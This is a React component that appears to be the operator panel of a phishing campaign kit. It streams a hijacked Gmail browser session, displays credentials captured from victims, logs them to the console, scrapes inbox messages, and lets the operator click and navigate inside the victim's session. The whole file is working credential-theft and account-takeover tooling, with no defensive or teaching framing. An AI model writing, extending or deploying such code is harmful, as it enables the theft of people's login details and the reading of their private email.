import React, { useState, useEffect, useRef } from 'react';
import httpClient from '../services/httpClient';
import io from 'socket.io-client';

const GmailBrowserModal = ({ isOpen, onClose, session, campaignId }) => {
  const [screenshot, setScreenshot] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [socket, setSocket] = useState(null);
  const [capturedCredentials, setCapturedCredentials] = useState([]);
  const [scrapedEmails, setScrapedEmails] = useState([]);
  const [sessionInfo, setSessionInfo] = useState(null);
  const [currentUrl, setCurrentUrl] = useState('');
  const screenshotIntervalRef = useRef(null);
  const canvasRef = useRef(null);
  const [isConnected, setIsConnected] = useState(false);

  // Initialize socket connection
  useEffect(() => {
    if (!isOpen || !session) return;

    const newSocket = io(process.env.REACT_APP_API_URL || 'http://localhost:5000');
    
    newSocket.on('connect', () => {
      console.log('Connected to Gmail browser socket');
      setIsConnected(true);
      
      // Join the Gmail session room
      newSocket.emit('joinGmailSession', {
        sessionToken: session.sessionToken,
        userId: 'dashboard-user'
      });
    });

    newSocket.on('disconnect', () => {
      console.log('Disconnected from Gmail browser socket');
      setIsConnected(false);
    });

    newSocket.on('sessionInfo', (info) => {
      setSessionInfo(info);
      setCurrentUrl(info.currentUrl || '');
    });

    newSocket.on('credentialsCaptured', (data) => {
      setCapturedCredentials(prev => [data, ...prev]);
      // Show notification
      console.log('🔑 New credentials captured:', data.credentials);
    });

    newSocket.on('emailsScraped', (data) => {
      setScrapedEmails(data.emails);
      console.log('📧 Emails scraped:', data.emails);
    });

    newSocket.on('pageNavigation', (data) => {
      setCurrentUrl(data.url);
      console.log('📍 Page navigation:', data.url);
    });

    newSocket.on('actionResult', (data) => {
      console.log('Action result:', data);
    });

    newSocket.on('screenshot', (data) => {
      setScreenshot(`data:image/png;base64,${data.screenshot}`);
      setIsLoading(false);
    });

    newSocket.on('sessionClosed', () => {
      console.log('Gmail session was closed');
      onClose();
    });

    setSocket(newSocket);

    return () => {
      if (screenshotIntervalRef.current) {
        clearInterval(screenshotIntervalRef.current);
      }
      newSocket.disconnect();
    };
  }, [isOpen, session, onClose]);

  // Request screenshot periodically
  useEffect(() => {
    if (!socket || !isConnected) return;

    // Initial screenshot request
    requestScreenshot();

    // Set up periodic screenshot updates
    screenshotIntervalRef.current = setInterval(() => {
      requestScreenshot();
    }, 2000); // Every 2 seconds

    return () => {
      if (screenshotIntervalRef.current) {
        clearInterval(screenshotIntervalRef.current);
      }
    };
  }, [socket, isConnected]);

  const requestScreenshot = () => {
    if (socket && isConnected) {
      socket.emit('requestScreenshot', {
        sessionToken: session.sessionToken
      });
    }
  };

  // Execute browser action
  const executeAction = (action, params = {}) => {
    if (socket && isConnected) {
      socket.emit('executeBrowserAction', {
        sessionToken: session.sessionToken,
        action,
        params,
        requestId: Date.now()
      });
    }
  };

  // Handle canvas click for remote interaction
  const handleCanvasClick = (event) => {
    if (!canvasRef.current) return;

    const canvas = canvasRef.current;
    const rect = canvas.getBoundingClientRect();
    const scaleX = canvas.width / rect.width;
    const scaleY = canvas.height / rect.height;
    
    const x = (event.clientX - rect.left) * scaleX;
    const y = (event.clientY - rect.top) * scaleY;

    executeAction('click', { x: Math.round(x), y: Math.round(y) });
  };

  // Navigate to URL
  const handleNavigate = (url) => {
    executeAction('navigate', { url });
  };

  // Close session
  const handleCloseSession = async () => {
    try {
      await httpClient.delete(`/api/gmail-browser/session/${session.sessionToken}`);
      onClose();
    } catch (error) {
      console.error('Error closing session:', error);
    }
  };

  // Load scraped emails
  const loadScrapedEmails = async () => {
    try {
      const response = await httpClient.get(`/api/gmail-browser/session/${session.sessionToken}/scraped-emails`);
      if (response.data.success) {
        setScrapedEmails(response.data.emails);
      }
    } catch (error) {
      console.error('Error loading scraped emails:', error);
    }
  };

  // Manually trigger email scraping
  const scrapeEmails = async () => {
    try {
      const response = await httpClient.post(`/api/gmail-browser/session/${session.sessionToken}/scrape-emails`);
      if (response.data.success) {
        setScrapedEmails(response.data.emails);
        console.log(`✅ Scraped ${response.data.count} emails`);
      }
    } catch (error) {
      console.error('Error scraping emails:', error);
    }
  };

  // Load scraped emails when modal opens
  useEffect(() => {
    if (isOpen && session) {
      loadScrapedEmails();
    }
  }, [isOpen, session]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="bg-cyber-dark border border-cyber-border rounded-xl w-full max-w-7xl h-full max-h-[90vh] flex flex-col">
        {/* Header */}
        <div className="flex items-center justify-between p-6 border-b border-cyber-border">
          <div className="flex items-center space-x-4">
            <div className="flex items-center space-x-2">
              <svg className="w-6 h-6 text-cyber-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
              </svg>
              <h2 className="text-xl font-semibold text-cyber-primary">
                Gmail Browser Control
              </h2>
            </div>
            
            <div className={`flex items-center space-x-2 ${isConnected ? 'text-green-400' : 'text-red-400'}`}>
              <div className={`w-2 h-2 rounded-full ${isConnected ? 'bg-green-400' : 'bg-red-400'} animate-pulse`}></div>
              <span className="text-sm">{isConnected ? 'Connected' : 'Disconnected'}</span>
            </div>
          </div>

          <div className="flex items-center space-x-3">
            <button
              onClick={requestScreenshot}
              className="glass-button px-3 py-2 rounded-lg text-sm"
            >
              📸 Refresh
            </button>
            <button
              onClick={scrapeEmails}
              className="glass-button px-3 py-2 rounded-lg text-sm bg-blue-500/20 hover:bg-blue-500/30"
            >
              📧 Scrape Emails
            </button>
            <button
              onClick={handleCloseSession}
              className="glass-button px-3 py-2 rounded-lg text-sm bg-red-500/20 hover:bg-red-500/30"
            >
              🔴 Close Session
            </button>
            <button
              onClick={onClose}
              className="glass-button p-2 rounded-lg"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>
        </div>

        {/* Browser Controls */}
        <div className="p-4 border-b border-cyber-border">
          <div className="flex items-center space-x-3">
            <div className="flex items-center space-x-2">
              <button
                onClick={() => executeAction('navigate', { url: 'https://accounts.google.com' })}
                className="glass-button px-3 py-1 rounded text-sm"
              >
                ← Back
              </button>
              <button
                onClick={() => executeAction('navigate', { url: currentUrl })}
                className="glass-button px-3 py-1 rounded text-sm"
              >
                🔄 Reload
              </button>
            </div>
            
            <div className="flex-1 bg-cyber-darker rounded-lg px-3 py-2">
              <input
                type="text"
                value={currentUrl}
                onChange={(e) => setCurrentUrl(e.target.value)}
                onKeyPress={(e) => e.key === 'Enter' && handleNavigate(currentUrl)}
                className="w-full bg-transparent text-cyber-primary text-sm outline-none"
                placeholder="Enter URL..."
              />
            </div>
            
            <button
              onClick={() => handleNavigate(currentUrl)}
              className="glass-button px-4 py-2 rounded-lg text-sm bg-cyber-primary/20"
            >
              Go
            </button>
          </div>
        </div>

        {/* Main Content */}
        <div className="flex flex-1 overflow-hidden">
          {/* Browser Screen */}
          <div className="flex-1 p-4">
            <div className="relative w-full h-full bg-white rounded-lg overflow-hidden">
              {isLoading ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-center">
                    <div className="loading-spinner mx-auto mb-4"></div>
                    <p className="text-gray-600">Loading browser view...</p>
                  </div>
                </div>
              ) : screenshot ? (
                <canvas
                  ref={canvasRef}
                  onClick={handleCanvasClick}
                  className="w-full h-full object-contain cursor-crosshair"
                  style={{ 
                    backgroundImage: `url(${screenshot})`,
                    backgroundSize: 'contain',
                    backgroundRepeat: 'no-repeat',
                    backgroundPosition: 'center'
                  }}
                />
              ) : (
                <div className="flex items-center justify-center h-full">
                  <p className="text-gray-600">No screenshot available</p>
                </div>
              )}
            </div>
          </div>

          {/* Side Panel */}
          <div className="w-80 border-l border-cyber-border p-4 space-y-4 overflow-y-auto">
            {/* Session Info */}
            <div className="glass-card p-4">
              <h3 className="text-lg font-semibold text-cyber-primary mb-3">Session Info</h3>
              <div className="space-y-2 text-sm">
                <div>
                  <span className="text-cyber-muted">Session:</span>
                  <div className="text-cyber-primary font-mono text-xs">{session.sessionToken}</div>
                </div>
                <div>
                  <span className="text-cyber-muted">Status:</span>
                  <span className="text-green-400 ml-2">Active</span>
                </div>
                {sessionInfo && (
                  <div>
                    <span className="text-cyber-muted">Viewers:</span>
                    <span className="text-cyber-primary ml-2">{sessionInfo.viewerCount || 0}</span>
                  </div>
                )}
              </div>
            </div>

            {/* Captured Credentials */}
            <div className="glass-card p-4">
              <h3 className="text-lg font-semibold text-cyber-primary mb-3">
                Captured Credentials ({capturedCredentials.length})
              </h3>
              <div className="space-y-2 max-h-48 overflow-y-auto">
                {capturedCredentials.length === 0 ? (
                  <p className="text-cyber-muted text-sm">No credentials captured yet</p>
                ) : (
                  capturedCredentials.map((cred, index) => (
                    <div key={index} className="bg-cyber-darker p-3 rounded-lg border border-green-500/20">
                      <div className="text-xs text-green-400 mb-1">
                        {new Date(cred.timestamp).toLocaleTimeString()}
                      </div>
                      <div className="text-sm">
                        {cred.credentials.email && (
                          <div>
                            <span className="text-cyber-muted">Email:</span>
                            <span className="text-cyber-primary ml-2">{cred.credentials.email}</span>
                          </div>
                        )}
                        {cred.credentials.password && (
                          <div>
                            <span className="text-cyber-muted">Password:</span>
                            <span className="text-cyber-primary ml-2">{'*'.repeat(cred.credentials.password.length)}</span>
                          </div>
                        )}
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>

            {/* Scraped Emails */}
            <div className="glass-card p-4">
              <h3 className="text-lg font-semibold text-cyber-primary mb-3">
                Scraped Emails ({scrapedEmails.length})
              </h3>
              <div className="space-y-2 max-h-64 overflow-y-auto">
                {scrapedEmails.length === 0 ? (
                  <p className="text-cyber-muted text-sm">No emails scraped yet</p>
                ) : (
                  scrapedEmails.map((email, index) => (
                    <div key={email.id || index} className="bg-cyber-darker p-3 rounded-lg border border-blue-500/20">
                      <div className="text-xs text-blue-400 mb-1">
                        {email.date} {email.isUnread && <span className="bg-blue-500 text-white px-1 rounded text-xs">NEW</span>}
                      </div>
                      <div className="text-sm">
                        <div className="text-cyber-primary font-medium truncate">
                          {email.sender}
                        </div>
                        <div className="text-cyber-text text-xs truncate">
                          {email.subject}
                        </div>
                        {email.snippet && (
                          <div className="text-cyber-muted text-xs mt-1 truncate">
                            {email.snippet}
                          </div>
                        )}
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>

            {/* Quick Actions */}
            <div className="glass-card p-4">
              <h3 className="text-lg font-semibold text-cyber-primary mb-3">Quick Actions</h3>
              <div className="space-y-2">
                <button
                  onClick={() => executeAction('scroll', { y: -100 })}
                  className="w-full glass-button p-2 rounded-lg text-sm"
                >
                  ⬆️ Scroll Up
                </button>
                <button
                  onClick={() => executeAction('scroll', { y: 100 })}
                  className="w-full glass-button p-2 rounded-lg text-sm"
                >
                  ⬇️ Scroll Down
                </button>
                <button
                  onClick={() => executeAction('screenshot')}
                  className="w-full glass-button p-2 rounded-lg text-sm"
                >
                  📸 Take Screenshot
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default GmailBrowserModal;
